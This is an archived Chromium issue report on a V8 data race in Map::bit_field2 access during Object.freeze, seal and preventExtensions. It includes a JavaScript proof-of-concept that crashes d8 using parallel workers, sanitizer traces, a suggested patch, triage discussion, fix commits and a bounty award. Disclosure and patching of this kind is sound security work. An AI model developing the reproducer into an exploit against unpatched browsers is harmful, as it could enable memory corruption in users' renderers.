# Data race in Map::bit_field2 access

| Field | Value |
|-------|-------|
| **Issue ID** | [473851441](https://issues.chromium.org/issues/473851441) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>JavaScript>Runtime |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | p1...@gmail.com |
| **Assignee** | ol...@chromium.org |
| **Created** | 2026-01-07 |
| **Bounty** | $7,000.00 |

## Description

## Summary

A data race vulnerability exists in V8's Map object where concurrent access to `bit_field2` (which contains `elements_kind`) between the main thread and Maglev/TurboFan background compilation threads can lead to memory corruption. The race occurs because `bit_field2` is accessed with non-atomic operations while being modified by `Object.freeze()`, `Object.seal()`, or `Object.preventExtensions()` on the main thread.

## Vulnerability Details

### Root Cause

The `bit_field2` field in `Map` objects is accessed using non-atomic read/write operations:

```
// src/objects/map-inl.h
uint8_t Map::bit_field2() const { return ReadField<uint8_t>(kBitField2Offset); }
void Map::set_bit_field2(uint8_t value) {
  WriteField<uint8_t>(kBitField2Offset, value);
}

```

When `Object.freeze()` executes on the main thread, it modifies `bit_field2` via `set_elements_kind()`. Concurrently, the Maglev background compilation thread reads `bit_field2` via `elements_kind()` in `MapUpdater::TryUpdateNoLock()`, creating a data race.

### Bisect

The issue was introduced in: <https://issues.chromium.org/issues/42210079>. Affected versions: M78 and later

The vulnerability affects `Object.freeze()`, `Object.seal()`, and `Object.preventExtensions()`.

## Proof of Concept

```
function f24() {
    function f23() {
        function F40(a42) {
            let v44 = a42.constructor;
            new v44(1.1);
            this.g = a42;
            Object.freeze(this);
        }
        let v50 = new F40(0);
        new F40(v50);
    }

    for (let i = 0; i < 5000000; i++) {
        f23();
    }
}

// Workers run in parallel and increase the chance of hitting the race between the
// main thread and background compiler threads.
const workers = [];
for (let i = 0; i < 30; i++) {
    workers.push(new Worker(f24, { type: "function" }));
}

for (const w of workers) {
    try {
        w.getMessage();
    } catch(e) {}
}

```
### Reproduction Steps

1. Build V8/d8 with the following configurations:

**Release build (args.gn):**

```
is_debug = false
target_cpu = "x64"
v8_enable_backtrace = true
v8_enable_disassembler = true
v8_enable_object_print = true
v8_static_library = true

```

**TSAN build (args.gn):**

```
dcheck_always_on = true
is_component_build = false
is_debug = false
is_tsan = true
target_cpu = "x64"
v8_enable_disassembler = true
v8_enable_object_print = true
v8_static_library = true

```

2. Run the PoC:

```
# Release build - crashes with SEGV
./out/release/d8 --expose-gc --allow-natives-syntax --jit-fuzzing poc.js

# TSAN build - detects data race
TSAN_OPTIONS=halt_on_error=1:abort_on_error=1 ./out/is_tsan/d8 --expose-gc --allow-natives-syntax --jit-fuzzing poc.js

```
## Crash Analysis

### Release Build Crash

```
Received signal 11 SEGV_ACCERR 03c78b482673
...
v8::internal::MapUpdater::TryUpdateNoLock
v8::internal::compiler::JSHeapBroker::ReadFeedbackForPropertyAccess
...
v8::internal::maglev::MaglevConcurrentDispatcher::JobTask::Run

```

**Note:** Due to the inherent instability of race conditions, crashes may occur at different locations. Adding garbage collection before the racing call (`new F40(v50);`) can help stabilize reproduction during exploitation.

### TSAN Report

```
WARNING: ThreadSanitizer: data race (pid=2363887)
  Read of size 1 at 0x7eac01034737 by thread T32:
    #0 ReadMaybeUnalignedValue<unsigned char> src/common/ptr-compr.h:215:12
    #1 ReadField<unsigned char> src/objects/heap-object.h:262:12
    #2 bit_field2 src/objects/map-inl.h:561:42
    #3 elements_kind src/objects/map-inl.h:673:47
    #4 MapUpdater::TryUpdateNoLock src/objects/map-updater.cc:428:46
    ...

  Previous write of size 1 at 0x7eac01034737 by main thread:
    #0 WriteMaybeUnalignedValue<unsigned char> src/common/ptr-compr.h:233:24
    #1 WriteField<unsigned char> src/objects/heap-object.h:270:12
    #2 set_bit_field2 src/objects/map-inl.h:564:3
    #3 set_elements_kind src/objects/map-inl.h:668:3
    #4 Map::CopyForPreventExtensions src/objects/map.cc:1941:14
    #5 JSObject::PreventExtensionsWithTransition src/objects/js-objects.cc:4581:33
    #6 JSReceiver::SetIntegrityLevel src/objects/js-objects.cc:2030:16
    #7 Builtin_Impl_ObjectFreeze src/builtins/builtins-object.cc:223:18

```
## Suggested Patch

The fix requires using relaxed atomic operations for `bit_field2` access, similar to how `bit_field` is already handled:

```
diff --git a/src/objects/map-inl.h b/src/objects/map-inl.h
index 3fc90007a82..d6d8c68337a 100644
--- a/src/objects/map-inl.h
+++ b/src/objects/map-inl.h
@@ -133,9 +133,9 @@ BIT_FIELD_ACCESSORS2(Map, relaxed_bit_field, bit_field, is_constructor,
                      Map::Bits1::IsConstructorBit)
 
 // |bit_field2| fields.
-BIT_FIELD_ACCESSORS(Map, bit_field2, new_target_is_base,
+BIT_FIELD_ACCESSORS(Map, relaxed_bit_field2, new_target_is_base,
                     Map::Bits2::NewTargetIsBaseBit)
-BIT_FIELD_ACCESSORS(Map, bit_field2, is_immutable_proto,
+BIT_FIELD_ACCESSORS(Map, relaxed_bit_field2, is_immutable_proto,
                     Map::Bits2::IsImmutablePrototypeBit)
 
 // |bit_field3| fields.
@@ -558,10 +558,20 @@ void Map::set_relaxed_bit_field(uint8_t value) {
   RELAXED_WRITE_BYTE_FIELD(*this, kBitFieldOffset, value);
 }
 
-uint8_t Map::bit_field2() const { return ReadField<uint8_t>(kBitField2Offset); }
+uint8_t Map::relaxed_bit_field2() const {
+  return RELAXED_READ_BYTE_FIELD(*this, kBitField2Offset);
+}
+
+void Map::set_relaxed_bit_field2(uint8_t value) {
+  RELAXED_WRITE_BYTE_FIELD(*this, kBitField2Offset, value);
+}
+
+uint8_t Map::bit_field2() const { 
+  return relaxed_bit_field2(); 
+}
 
 void Map::set_bit_field2(uint8_t value) {
-  WriteField<uint8_t>(kBitField2Offset, value);
+  set_relaxed_bit_field2(value);
 }
 
 uint32_t Map::bit_field3() const {
@@ -665,8 +675,8 @@ bool Map::TryGetValidityCellHolderMap(
 
 void Map::set_elements_kind(ElementsKind elements_kind) {
   CHECK_LT(static_cast<int>(elements_kind), kElementsKindCount);
-  set_bit_field2(
-      Map::Bits2::ElementsKindBits::update(bit_field2(), elements_kind));
+  set_relaxed_bit_field2(
+      Map::Bits2::ElementsKindBits::update(relaxed_bit_field2(), elements_kind));
 }
 
 ElementsKind Map::elements_kind() const {
diff --git a/src/objects/map.h b/src/objects/map.h
index 9c25eee64d2..baa34ec4fb0 100644
--- a/src/objects/map.h
+++ b/src/objects/map.h
@@ -325,6 +325,8 @@ class Map : public TorqueGeneratedMap<Map, HeapObject> {
   //
   DECL_PRIMITIVE_ACCESSORS(bit_field2, uint8_t)
 
+  DECL_PRIMITIVE_ACCESSORS(relaxed_bit_field2, uint8_t)
+
   // Bit positions for |bit_field2|.
   struct Bits2 {
     DEFINE_TORQUE_GENERATED_MAP_BIT_FIELDS2()

```
## Security Impact

This vulnerability allows:

1. **Memory corruption** through data race of `elements_kind`
2. **Type confusion** if inconsistent `elements_kind` values are observed

## Version Information

- **V8 Version:** latest at time of testing - 14.5.170
- **Operating System:** Linux x64 (Ubuntu)
- **Architecture:** x86\_64

## Credit Information

Reporter credit: @p1nky4745

## Attachments

- [poc.js](attachments/poc.js) (text/javascript, 515 B)

## Timeline

### p1...@gmail.com (2026-01-07)

## Offtop

Found another potential bug in `FeedbackNexus::ConfigurePolymorphic` ([Source code](https://source.chromium.org/chromium/chromium/src/+/a082fe545717717c53b9fc613d4f580505e95e7a:v8/src/objects/feedback-vector.cc;l=1108)).

The second loop will never execute because `current` already equals `receiver_count` after the first loop completes. This means deprecated maps are never written to the array, potentially leaving uninitialized slots.

I don't have a Proof of Concept, but I believe the fix should be:

```
for (current = 0; current < receiver_count; ++current) {

```

### ch...@google.com (2026-01-07)

This V8 bug has been marked as either a release blocker or a vulnerability bug. V8 bugs affect all OSs supported by Chrome, so the OS field has been updated to reflect this. Please update the bug with the correct OS field if it only affects a subset of OSes.

### cl...@appspot.gserviceaccount.com (2026-01-07)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6582565511036928.

### cl...@appspot.gserviceaccount.com (2026-01-07)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6411123502809088.

### 24...@project.gserviceaccount.com (2026-01-07)

Testcase 6411123502809088 failed to reproduce the crash. Please inspect the program output at https://clusterfuzz.com/testcase?key=6411123502809088.

### 24...@project.gserviceaccount.com (2026-01-07)

Testcase 6582565511036928 failed to reproduce the crash. Please inspect the program output at https://clusterfuzz.com/testcase?key=6582565511036928.

### cl...@appspot.gserviceaccount.com (2026-01-08)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6174240352960512.

### dr...@chromium.org (2026-01-08)

[security triage] I'm not able to reproduce the SEGV, but I did get a TSAN violation at HEAD. Going to let Clusterfuzz's tsan builder take a look.

### 24...@project.gserviceaccount.com (2026-01-08)

Detailed Report: https://clusterfuzz.com/testcase?key=6174240352960512

Fuzzer: None
Job Type: linux_tsan_d8
Platform Id: linux

Crash Type: Data race READ 1
Crash Address: 0x7ebe01e029b7
Crash State:
  v8::internal::MapUpdater::TryUpdateNoLock
  v8::internal::compiler::JSHeapBroker::ReadFeedbackForPropertyAccess
  v8::internal::compiler::JSHeapBroker::GetFeedbackForPropertyAccess
  
Sanitizer: thread (TSAN)

Regressed: https://clusterfuzz.com/revisions?job=linux_tsan_d8&range=103145:103146

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=6174240352960512

To reproduce this, please build the target in this report and run it against the reproducer testcase. Please use the GN arguments provided at bottom of this report when building the binary.

If you have trouble reproducing, please also export the environment variables listed under "[Environment]" in the crash stacktrace.

If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


### dr...@chromium.org (2026-01-08)

Nice! Clusterfuzz got it. I'm going to assume that this can lead to RCE in the renderer sandbox, so setting severity S1 and triaging to the owner of the [CL](https://crrev.com/c/7045719) that introduced this.

### 24...@project.gserviceaccount.com (2026-01-08)

Automatically applying components based on crash stacktrace and information from OWNERS files.

If this is incorrect, please apply the hotlistid:4801165.

### ch...@google.com (2026-01-09)

Setting milestone because of s0/s1 severity.

### ch...@google.com (2026-01-09)

Setting Priority to P1 to match Severity s1. If this is incorrect, please reset the priority. The automation bot account won't make this change again.

### ol...@chromium.org (2026-01-12)

The bug here is that we insert the integrity level transition into the map tree before updating the target map.

### ol...@chromium.org (2026-01-12)

I suspect that this is the actual culprit of <https://issues.chromium.org/issues/370536107> .

Not sure about the security impact. There is certainly potential for tricking the compiler into compiling code for a non-sealed vs sealed elements kind. But I am unsure if there is any way this results in e.g. a type confusion in the generated code. The crashes in the compiler should all be CHECKs.

### dx...@google.com (2026-01-12)

Project: v8/v8  

Branch:  main  

Author:  Olivier Flückiger [olivf@chromium.org](mailto:olivf@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7450862>

[map] Fix publishing of integrity-level transitions

---


Expand for full commit details
```
     
    Integrity level transition target maps should not be published to the 
    map tree before they are fully initialized. Otherwise concurrent access 
    might pick up not fully updated target maps. 
     
    Drive-By: Fix a dcheck in the map-updater to not fire when an indirectly 
    reachable non-deprecatable map is deprecated due to the whole subtree 
    being deprecated. 
     
    Fixed: 473851441 
    Change-Id: Ibfe62aa63e63873554420774a0b269e7f2cd594f 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7450862 
    Auto-Submit: Olivier Flückiger <olivf@chromium.org> 
    Reviewed-by: Toon Verwaest <verwaest@chromium.org> 
    Commit-Queue: Toon Verwaest <verwaest@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#104646}

```

---

Files:

- M `src/objects/map.cc`
- M `src/objects/map.h`

---

Hash: [e7f117bdb2fb4acbe619cf26aae2e011bf7f0e25](https://chromiumdash.appspot.com/commit/e7f117bdb2fb4acbe619cf26aae2e011bf7f0e25)  

Date: Mon Jan 12 14:41:30 2026


---

### ch...@google.com (2026-01-13)

Security Merge Request Consideration: This is sufficiently serious that it should be merged to stable. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M143. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request Consideration: This is sufficiently serious that it should be merged to beta. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M144. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request: Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [].

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.
6. (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

### ch...@google.com (2026-01-13)

Merge review required: M144 is already shipping to stable.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: alonbajayo (ChromeOS), srinivassista (Desktop US), None (Desktop EMEA), govind (Mobile US), eakpobaro (Mobile EMEA)

### ch...@google.com (2026-01-13)

Merge review required: M143 is already shipping to stable.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: lmenezes (ChromeOS), srinivassista (Desktop US), danielyip (Desktop EMEA), harrysouders (Mobile US), eakpobaro (Mobile EMEA)

### dr...@chromium.org (2026-01-13)

Given that M144 is ramping up as Stable right now, we're not going to merge to M143. So removing that label. We still may want to merge into any M144 respins, so I'll check on the M144 merge after the CL has some time in Canary.

### dr...@chromium.org (2026-01-14)

No crashes in Canary in any of the relevant functions. Approving the merge to M144.

### ch...@google.com (2026-01-15)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

Thanks for your time! To disable nags, add Disable-Nags (case sensitive) to the Chromium Labels custom field.

### dx...@google.com (2026-01-15)

Project: v8/v8  

Branch:  refs/branch-heads/14.4  

Author:  Olivier Flückiger [olivf@chromium.org](mailto:olivf@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7485546>

Merged: [map] Fix publishing of integrity-level transitions

---


Expand for full commit details
```
     
    Integrity level transition target maps should not be published to the 
    map tree before they are fully initialized. Otherwise concurrent access 
    might pick up not fully updated target maps. 
     
    Drive-By: Fix a dcheck in the map-updater to not fire when an indirectly 
    reachable non-deprecatable map is deprecated due to the whole subtree 
    being deprecated. 
     
    Fixed: 473851441 
    (cherry picked from commit e7f117bdb2fb4acbe619cf26aae2e011bf7f0e25) 
     
    Change-Id: I8530281a55bbeed1dd158a126bad807029bf47ae 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7485546 
    Bot-Commit: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com> 
    Commit-Queue: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com> 
    Auto-Submit: Olivier Flückiger <olivf@chromium.org> 
    Cr-Commit-Position: refs/branch-heads/14.4@{#40} 
    Cr-Branched-From: 80acc26727d5a34e77dabeebe7c9213ec1bd4768-refs/heads/14.4.258@{#1} 
    Cr-Branched-From: ce7e597e90f6df3fa4b6df224bc613b80c635450-refs/heads/main@{#104020}

```

---

Files:

- M `src/objects/map.cc`
- M `src/objects/map.h`

---

Hash: [dba49550b12d2aa83e8f40b17bd79c5f7999b64c](https://chromiumdash.appspot.com/commit/dba49550b12d2aa83e8f40b17bd79c5f7999b64c)  

Date: Mon Jan 12 14:41:30 2026


---

### sr...@chromium.org (2026-01-15)

Please help complete all your merges before 2pm PST on friday Jan 16, so they can be part of the respin next week , with monday being a holiday we want to get everything complete by Friday . Please reach out to me if you cannot complete the merges and need help

### pe...@google.com (2026-01-15)

LTS Milestone M138

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?

### wf...@chromium.org (2026-01-16)

The panel determined this was not a rewardable security issue it would hit a check. The panel did not believe this issue would have any security consequences. If you can prove otherwise please feel free to submit further evidence to the contrary.

### wf...@chromium.org (2026-01-16)

see above for reasoning

### p1...@gmail.com (2026-01-16)

It's important to understand that the key characteristic of a race condition is that it can occur at any moment, including immediately after the check `old_map->elements_kind() != (*result)->elements_kind()` passes. In my PoC, this manifests as `HOLEY_FROZEN_ELEMENTS (11) vs. HOLEY_ELEMENTS (3)`, but the values can differ.

Consider the following scenario:

1. The check in the code passes successfully (`old_map->elements_kind() == (*result)->elements_kind()`)
2. Immediately after, the race condition occurs
3. `return result;` is executed with an incorrect `elements_kind`
4. Then `maps.push_back(map);` is executed without any CHECK validation in the code
5. This results in a Map inconsistency between the Main Thread and the Background Compiler Thread

Therefore, the check `old_map->elements_kind() != (*result)->elements_kind()` can only signal the problem, not eliminate it.

### p1...@gmail.com (2026-01-16)

To me, this looks like TOCTOU

### wf...@chromium.org (2026-01-16)

Thanks for your reply, we will put this back for panel to assess based on the information you provide.

### ol...@chromium.org (2026-01-19)

As already stated I agree with the reporter that this can cause us to compile code for the wrong elements kind (frozen/sealed vs normal), or the wrong setting of is\_extensible. The question is if that can be leveraged? And I am not fully sure myself. I don't think that our compilers currently use the fact that frozen elements are constant. Otoh, I found at least one instance in the compiler where we do use is\_extensible to guard an optimization: <https://source.chromium.org/chromium/chromium/src/+/main:v8/src/compiler/heap-refs.cc;l=890;bpv=1;bpt=1>

### pe...@google.com (2026-01-22)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)

### qk...@google.com (2026-01-22)

1. <https://chromium-review.googlesource.com/c/v8/v8/+/7488490>
2. Low, no conflicts
3. 144
4. Yes, M138 has the suspected CL[1] mentioned in [comment #16](https://issues.chromium.org/issues/473851441#comment16) and the description of this bug.

[1] <https://chromium-review.googlesource.com/c/v8/v8/+/6037707>

### an...@google.com (2026-01-23)

Waiting for M144 to hit Stable next week. 

### sp...@google.com (2026-01-26)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $7000.00 for this report.


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### dx...@google.com (2026-03-10)

Project: v8/v8  

Branch:  refs/branch-heads/13.8  

Author:  Olivier Flückiger [olivf@chromium.org](mailto:olivf@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7488490>

[M138-LTS][map] Fix publishing of integrity-level transitions

---


Expand for full commit details
```
     
    Integrity level transition target maps should not be published to the 
    map tree before they are fully initialized. Otherwise concurrent access 
    might pick up not fully updated target maps. 
     
    Drive-By: Fix a dcheck in the map-updater to not fire when an indirectly 
    reachable non-deprecatable map is deprecated due to the whole subtree 
    being deprecated. 
     
    (cherry picked from commit e7f117bdb2fb4acbe619cf26aae2e011bf7f0e25) 
     
    Fixed: 473851441 
    Change-Id: Ibfe62aa63e63873554420774a0b269e7f2cd594f 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7450862 
    Auto-Submit: Olivier Flückiger <olivf@chromium.org> 
    Reviewed-by: Toon Verwaest <verwaest@chromium.org> 
    Commit-Queue: Toon Verwaest <verwaest@chromium.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#104646} 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7488490 
    Reviewed-by: Olivier Flückiger <olivf@chromium.org> 
    Commit-Queue: Gyuyoung Kim (xWF) <qkim@google.com> 
    Cr-Commit-Position: refs/branch-heads/13.8@{#102} 
    Cr-Branched-From: 61ddd471ece346840bbebbb308dceb4b4ce31b28-refs/heads/13.8.258@{#1} 
    Cr-Branched-From: fdb5de2c741658e94944f2ec1218530e98601c23-refs/heads/main@{#100480}

```

---

Files:

- M `src/objects/map.cc`
- M `src/objects/map.h`

---

Hash: [bc4b7082c84c51dada2c62b596a061172d9fd825](https://chromiumdash.appspot.com/commit/bc4b7082c84c51dada2c62b596a061172d9fd825)  

Date: Mon Jan 12 14:41:30 2026


---

### ch...@google.com (2026-04-21)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/473851441)*
